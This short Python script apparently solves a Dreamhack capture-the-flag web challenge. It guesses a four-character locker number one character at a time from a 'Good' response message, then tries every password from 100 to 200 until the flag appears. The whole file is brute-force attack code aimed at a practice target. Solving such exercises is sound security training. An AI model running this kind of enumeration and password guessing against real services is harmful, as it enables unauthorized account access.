import random
import string
import requests

url = "http://host3.dreamhack.games:15509/"

rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits #abcdefghijklmnopqrstuvwxyz0123456789

rand_num = random.randint(100, 200)

locker_num = ""
for i in range(4):
    for j in alphanumeric:
        print(locker_num+j)
        res = requests.post(url, data={"locker_num": locker_num+j})
        if "Good" in res.text:
            locker_num += j
            break

for k in range(100, 201):
    res2 = requests.post(url, data={"locker_num": locker_num, "password": k})
    print(k)
    if "DH{" in res2.text:
        print(res2.text)
        break
